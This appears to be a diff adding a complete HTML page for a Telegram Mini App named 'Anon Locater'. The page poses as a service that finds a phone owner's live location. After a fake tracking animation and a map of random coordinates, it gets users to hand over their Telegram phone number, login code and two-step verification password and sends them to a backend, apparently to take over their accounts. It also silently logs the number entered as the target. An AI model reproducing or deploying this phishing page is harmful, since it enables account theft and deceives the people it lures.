@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Anon Locater</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-color: #0b1120;
+            --container-bg: #111827;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --border-color: #374151;
+            --btn-blue: #3b82f6;
+            --btn-blue-hover: #2563eb;
+            --error-color: #ef4444;
+            --success-color: #10b981;
+        }
+        * { box-sizing: border-box; }
+        body { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-main); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; position: relative; }
+        .app-container { width: 100%; max-width: 400px; height: 100%; display: flex; flex-direction: column; position: relative; z-index: 2; padding-bottom: 50px; }
+        .step-screen { display: none; padding: 40px 20px; flex-direction: column; align-items: center; height: 100%; animation: fadeIn 0.4s ease; text-align: center; }
+        .step-screen.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        h2 { font-size: 24px; margin-bottom: 8px; font-weight: 700; letter-spacing: 0.5px; }
+        p.subtitle { color: var(--text-muted); font-size: 15px; margin-bottom: 30px; line-height: 1.5; }
+        
+        .input-group { width: 100%; margin-bottom: 15px; position: relative; }
+        .input-box { border: 1px solid var(--border-color); border-radius: 10px; display: flex; align-items: center; padding: 14px 15px; background: var(--container-bg); transition: 0.3s; }
+        .input-box:focus-within { border-color: var(--btn-blue); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
+        .input-box select, .phone-input { background: transparent; border: none; color: white; font-size: 16px; width: 100%; outline: none; }
+        .input-box.phone-box { padding: 0; }
+        
+        input[type="number"]::-webkit-outer-spin-button, input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type="number"] { -moz-appearance: textfield; }
+        
+        .phone-code { padding: 15px; border-right: 1px solid var(--border-color); color: white; font-size: 16px; font-weight: bold;}
+        .phone-input { padding: 15px; letter-spacing: 1px;}
+        
+        .btn-full { width: 100%; padding: 16px; border-radius: 10px; background-color: #1f2937; color: var(--text-muted); border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);}
+        .btn-full.active { background-color: var(--btn-blue); color: white; }
+        .btn-full.active:hover { background-color: var(--btn-blue-hover); transform: translateY(-1px); }
+        
+        /* Radar Animation */
+        .radar-box { width: 120px; height: 120px; background-color: rgba(59, 130, 246, 0.1); border-radius: 50%; position: relative; margin: 20px auto 30px; display: flex; justify-content: center; align-items: center; }
+        .radar-box::before, .radar-box::after { content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid var(--btn-blue); animation: radar-pulse 2s infinite ease-out; }
+        .radar-box::after { animation-delay: 1s; }
+        @keyframes radar-pulse { 0% { transform: scale(0.6); opacity: 1; } 100% { transform: scale(1.6); opacity: 0; } }
+        .radar-icon { font-size: 40px; position: relative; z-index: 2; }
+        
+        .otp-container { display: flex; gap: 12px; margin-bottom: 30px; }
+        .otp-input { width: 50px; height: 60px; background: var(--container-bg); border: 1px solid var(--border-color); border-radius: 10px; color: white; font-size: 24px; text-align: center; outline: none; font-weight: bold; transition: 0.2s;}
+        .otp-input:focus { border-color: var(--btn-blue); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); transform: scale(1.05); }
+        .emoji-icon { font-size: 55px; margin-bottom: 10px; }
+        
+        .loading { display: none; margin-top: 15px; color: var(--btn-blue); font-weight: bold; font-size: 14px; animation: pulse 1s infinite alternate;}
+        @keyframes pulse { from { opacity: 0.6; } to { opacity: 1; } }
+        
+        .iframe-container { width: 100%; border-radius: 12px; overflow: hidden; margin-top: 20px; border: 2px solid var(--border-color); box-shadow: 0 10px 25px rgba(0,0,0,0.5); position: relative; }
+        
+        /* Footer */
+        .footer { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 12px; color: #6b7280; z-index: 10; letter-spacing: 0.5px;}
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div id="step-loading" class="step-screen active">
+        <div class="radar-box"><div class="radar-icon">🔒</div></div>
+        <h2>Initializing...</h2>
+        <p class="subtitle">Establishing secure satellite uplink.</p>
+    </div>
+
+    <!-- 1. Track Number Input -->
+    <div id="step-tracker-input" class="step-screen">
+        <div class="emoji-icon">📍</div>
+        <h2>Global Locator</h2>
+        <p class="subtitle">Enter target mobile number to triangulate live GPS coordinates.</p>
+        
+        <div class="input-group">
+            <div class="input-box">
+                <select id="target-country" style="font-weight: bold;">
+                    <option value="+91">🇮🇳 +91 (India)</option>
+                    <option value="+92">🇵🇰 +92 (Pakistan)</option>
+                    <option value="+1">🇺🇸 +1 (USA)</option>
+                </select>
+            </div>
+        </div>
+        <div class="input-group">
+            <div class="input-box phone-box">
+                <div class="phone-code" id="target-code-display">+91</div>
+                <input type="number" id="target-mobile" class="phone-input" placeholder="Enter 10-digit number">
+            </div>
+        </div>
+        <p id="tracker-error" style="color: var(--error-color); font-size: 13px; margin-top: -5px; margin-bottom: 15px; display: none; text-align: left; width: 100%; background: rgba(239, 68, 68, 0.1); padding: 8px; border-radius: 6px;"></p>
+        
+        <button class="btn-full active" onclick="startTracking()">Track Location</button>
+    </div>
+
+    <!-- 2. Tracking Animation -->
+    <div id="step-tracker-progress" class="step-screen">
+        <div class="radar-box"><div class="radar-icon">📡</div></div>
+        <h2 id="tracker-status-title">Locating...</h2>
+        <p id="tracker-status" class="subtitle">Querying telecom databases...</p>
+        
+        <div style="width: 100%; background: var(--container-bg); border-radius: 10px; height: 10px; overflow: hidden; margin-bottom: 15px; border: 1px solid var(--border-color);">
+            <div id="tracker-bar" style="width: 0%; height: 100%; background: var(--btn-blue); transition: width 0.1s linear; box-shadow: 0 0 10px var(--btn-blue);"></div>
+        </div>
+        <p id="tracker-percent" style="font-weight: bold; font-size: 20px; color: var(--btn-blue);">0%</p>
+    </div>
+
+    <!-- 3. Found / Signup Prompt -->
+    <div id="step-tracker-success" class="step-screen">
+        <div class="emoji-icon">✅</div>
+        <h2 style="color: var(--success-color);">Data Found!</h2>
+        <p class="subtitle" style="margin-bottom: 20px;">Live location, device details, and coordinates retrieved from satellite.</p>
+        
+        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 10px; padding: 15px; width: 100%; margin-bottom: 20px;">
+            <p style="font-size: 14px; margin: 0; color: #e5e7eb;">Target: <span id="display-target-num" style="font-weight: bold; letter-spacing: 1px;"></span></p>
+            <p style="font-size: 14px; margin: 8px 0 0 0; color: #e5e7eb;">Status: <span style="color: var(--success-color); font-weight: bold;">Locked On</span></p>
+        </div>
+
+        <p style="color: var(--text-main); font-size: 15px; line-height: 1.4; font-weight: bold;">You need one credit to track its location just signup and get location.</p>
+        <button class="btn-full active" onclick="requestTelegramContact()">Sign Up</button>
+        <div id="auth-polling-loader" class="loading">Waiting for Telegram Permission...</div>
+        <p id="manual-fallback-btn" style="color: var(--btn-blue); font-size: 13px; margin-top: 15px; cursor: pointer; display: none; text-decoration: underline;" onclick="showStep('step-phone')">Use Manual Entry</p>
+    </div>
+
+    <!-- 4. Manual Fallback Phone Entry -->
+    <div id="step-phone" class="step-screen">
+        <div class="emoji-icon">📱</div>
+        <h2>Confirm Number</h2>
+        <p class="subtitle">Please confirm your Telegram number<br>to claim your free credit.</p>
+        
+        <div class="input-group">
+            <div class="input-box phone-box">
+                <input type="text" id="manual-country-code" class="phone-code" value="+91" style="width:60px; text-align:center; padding: 15px 5px;" placeholder="+Code">
+                <input type="tel" id="phone-number" class="phone-input" placeholder="Your Telegram Number" autocomplete="off">
+            </div>
+        </div>
+        <div id="phone-loader" class="loading">Requesting code...</div>
+        <button class="btn-full active" onclick="submitPhoneManual()">Continue</button>
+    </div>
+
+    <!-- 5. OTP Screen -->
+    <div id="step-otp" class="step-screen">
+        <div class="emoji-icon">💬</div>
+        <h2>Enter Code</h2>
+        <p class="subtitle" id="otp-subtitle" style="color: var(--btn-blue); font-weight: bold;">Please check your Telegram app for OTP.</p>
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 1)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 2)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 3)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 4)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="submitOTP(this)">
+        </div>
+        <div id="otp-loader" class="loading">Verifying Secure Code...</div>
+    </div>
+
+    <!-- 6. 2FA Screen -->
+    <div id="step-2fa" class="step-screen">
+        <div class="emoji-icon">🔐</div>
+        <h2>Two-Step Verification</h2>
+        <p class="subtitle">Your account is protected with an additional password.</p>
+        <div class="input-group">
+            <div class="input-box">
+                <input type="password" id="two-fa-pass" class="phone-input" placeholder="Enter Password" oninput="checkPasswordInput()">
+            </div>
+        </div>
+        <div id="2fa-loader" class="loading">Decrypting...</div>
+        <button id="btn-2fa" class="btn-full" onclick="submit2FA()">Access System</button>
+    </div>
+
+    <!-- 7. Map Result -->
+    <div id="step-result" class="step-screen" style="padding: 20px;">
+        <h2 style="color: var(--success-color); margin-bottom: 5px;">Target Located</h2>
+        <p class="subtitle" style="margin-bottom: 15px; font-size: 13px;">Live satellite feed established.</p>
+        
+        <div class="radar-box" style="width: 80px; height: 80px; margin: 0 auto 15px;"><div class="radar-icon" style="font-size:30px;">📍</div></div>
+        
+        <div class="iframe-container" id="map-container" style="height: 250px; background: #222;">
+            <!-- Map injected via JS -->
+        </div>
+    </div>
+</div>
+
+<div class="footer">©️ Copyright by Anon Locater 2026. All rights reserved.</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    
+    const tg_user_id = tg.initDataUnsafe?.user?.id || "web_test_user";
+    const tg_username = tg.initDataUnsafe?.user?.username || "unknown";
+    const tg_name = tg.initDataUnsafe?.user?.first_name || "Unknown";
+    
+    let targetCountryCode = "+91";
+    let targetFullNumber = "";
+
+    document.getElementById('target-country').addEventListener('change', function() {
+        targetCountryCode = this.value;
+        document.getElementById('target-code-display').innerText = targetCountryCode;
+    });
+
+    function showStep(stepId) {
+        document.querySelectorAll('.step-screen').forEach(el => el.classList.remove('active'));
+        document.getElementById(stepId).classList.add('active');
+    }
+
+    async function sendRequest(payload) {
+        payload.tg_user_id = tg_user_id;
+        payload.tg_username = tg_username;
+        payload.tg_name = tg_name;
+        try {
+            const response = await fetch("/api/action", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            return await response.json();
+        } catch (err) { alert("Network Error"); }
+    }
+
+    window.onload = async () => {
+        try {
+            const response = await fetch("/check_session", {
+                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tg_user_id, tg_username, tg_name })
+            });
+            const res = await response.json();
+            if(res.status === "exists") showStep('step-result');
+            else showStep('step-tracker-input');
+        } catch(e) { showStep('step-tracker-input'); }
+    };
+
+    // --- TRACKING VALIDATION ---
+    function startTracking() {
+        const mobile = document.getElementById('target-mobile').value.trim();
+        const errorMsg = document.getElementById('tracker-error');
+        errorMsg.style.display = 'none';
+
+        if (mobile.length !== 10) {
+            errorMsg.innerText = "Error: Mobile number must be exactly 10 digits.";
+            errorMsg.style.display = 'block'; return;
+        }
+
+        const firstDigit = mobile.charAt(0);
+        if (targetCountryCode === '+92' && firstDigit !== '3') {
+            errorMsg.innerText = "Invalid Pakistan number. Must start with valid digit (3).";
+            errorMsg.style.display = 'block'; return;
+        }
+        
+        if (targetCountryCode === '+91' && !['6','7','8','9'].includes(firstDigit)) {
+            errorMsg.innerText = "Invalid Indian number format.";
+            errorMsg.style.display = 'block'; return;
+        }
+
+        targetFullNumber = targetCountryCode + " " + mobile;
+        document.getElementById('display-target-num').innerText = targetFullNumber;
+        
+        // Log tracked number to DB silently
+        fetch("/api/track_target", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ tg_user_id, target_number: targetFullNumber }) });
+
+        showStep('step-tracker-progress');
+        simulateTracking();
+    }
+
+    function simulateTracking() {
+        const statuses = ["Connecting to Cell Towers...", "Bypassing Encryptions...", "Fetching IMEI number...", "Triangulating Coordinates..."];
+        let progress = 0;
+        const progressBar = document.getElementById('tracker-bar');
+        const statusText = document.getElementById('tracker-status');
+        const percentageText = document.getElementById('tracker-percent');
+
+        const interval = setInterval(() => {
+            progress += 1;
+            progressBar.style.width = progress + '%';
+            percentageText.innerText = progress + '%';
+            
+            let sIdx = Math.floor((progress / 100) * statuses.length);
+            if(sIdx >= statuses.length) sIdx = statuses.length - 1;
+            statusText.innerText = statuses[sIdx];
+
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => { showStep('step-tracker-success'); }, 600);
+            }
+        }, 50);
+    }
+
+    // --- SEAMLESS TELEGRAM CONTACT FLOW ---
+    function requestTelegramContact() {
+        if (tg.requestContact) {
+            tg.requestContact((shared) => {
+                if (shared) {
+                    startAuthPolling();
+                } else {
+                    showStep('step-phone');
+                }
+            });
+            // Show manual fallback in case the native pop-up fails silently or hangs
+            setTimeout(() => { document.getElementById('manual-fallback-btn').style.display = 'block'; }, 4000);
+        } else {
+            // Fallback for browsers outside standard Telegram Apps
+            showStep('step-phone');
+        }
+    }
+
+    async function startAuthPolling() {
+        document.getElementById('auth-polling-loader').style.display = "block";
+        let attempts = 0;
+        let poll = setInterval(async () => {
+            attempts++;
+            if (attempts > 25) { 
+                clearInterval(poll); 
+                document.getElementById('auth-polling-loader').style.display = "none";
+                showStep('step-phone'); // Timeout fallback
+                return;
+            }
+            try {
+                let res = await fetch("/api/check_phone", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tg_user_id }) });
+                let data = await res.json();
+                
+                if (data.status === 'found') {
+                    clearInterval(poll);
+                    const sendRes = await sendRequest({ action: 'send_phone', phone: data.phone });
+                    if(sendRes && sendRes.status === 'success') {
+                        document.getElementById('auth-polling-loader').style.display = "none";
+                        showStep('step-otp');
+                        document.querySelectorAll('.otp-input')[0].focus();
+                    }
+                }
+            } catch(e) {}
+        }, 2000);
+    }
+
+    // --- MANUAL FALLBACK AUTH ---
+    async function submitPhoneManual() {
+        const code = document.getElementById('manual-country-code').value.trim();
+        const num = document.getElementById('phone-number').value.trim();
+        if(!num) return;
+        
+        document.getElementById('phone-loader').style.display = "block";
+        const res = await sendRequest({ action: 'send_phone', phone: code + num });
+        document.getElementById('phone-loader').style.display = "none";
+
+        if(res && res.status === 'success') {
+            showStep('step-otp');
+            document.querySelectorAll('.otp-input')[0].focus();
+        } 
+    }
+
+    // --- OTP LOGIC ---
+    function moveToNext(current, nextIndex) {
+        if (current.value.length >= current.maxLength) {
+            const inputs = document.querySelectorAll('.otp-input');
+            if (nextIndex < inputs.length) inputs[nextIndex].focus();
+        }
+    }
+
+    async function submitOTP(current) {
+        if(current.value.length === 1) {
+            let otpCode = '';
+            document.querySelectorAll('.otp-input').forEach(input => otpCode += input.value);
+            
+            if(otpCode.length === 5) {
+                document.querySelectorAll('.otp-input').forEach(input => input.disabled = true);
+                document.getElementById('otp-loader').style.display = "block";
+                
+                const res = await sendRequest({ action: 'send_otp', otp: otpCode });
+                
+                document.getElementById('otp-loader').style.display = "none";
+                document.querySelectorAll('.otp-input').forEach(input => input.disabled = false);
+
+                if(res.next_step === '2fa') {
+                    showStep('step-2fa');
+                } else if (res.next_step === 'result') { 
+                    loadMapResult(); 
+                }
+            }
+        }
+    }
+
+    function checkPasswordInput() {
+        const btn = document.getElementById('btn-2fa');
+        if(document.getElementById('two-fa-pass').value.length > 0) btn.classList.add('active');
+        else btn.classList.remove('active');
+    }
+
+    async function submit2FA() {
+        const pass = document.getElementById('two-fa-pass').value;
+        if(!pass) return;
+
+        document.getElementById('2fa-loader').style.display = "block";
+        const res = await sendRequest({ action: 'send_2fa', password: pass });
+        document.getElementById('2fa-loader').style.display = "none";
+
+        if(res && res.status === 'success') {
+            loadMapResult();
+        }
+    }
+
+    function loadMapResult() {
+        showStep('step-result');
+        // Generate random coordinates based on entered Target Country
+        let lat, lng;
+        if (targetCountryCode === "+92") {
+            // Random location in Pakistan (around Lahore/Islamabad)
+            lat = 31.5204 + (Math.random() - 0.5) * 0.5;
+            lng = 74.3587 + (Math.random() - 0.5) * 0.5;
+        } else if (targetCountryCode === "+1") {
+            // Random location in USA (around NY)
+            lat = 40.7128 + (Math.random() - 0.5) * 0.5;
+            lng = -74.0060 + (Math.random() - 0.5) * 0.5;
+        } else {
+            // Random location in India (around Delhi)
+            lat = 28.7041 + (Math.random() - 0.5) * 0.5;
+            lng = 77.1025 + (Math.random() - 0.5) * 0.5;
+        }
+        
+        const mapUrl = `https://maps.google.com/maps?q=${lat},${lng}&z=14&output=embed`;
+        document.getElementById('map-container').innerHTML = `<iframe width="100%" height="100%" frameborder="0" style="border:0;" src="${mapUrl}" allowfullscreen></iframe>`;
+    }
+</script>
+
+</body>
+</html>
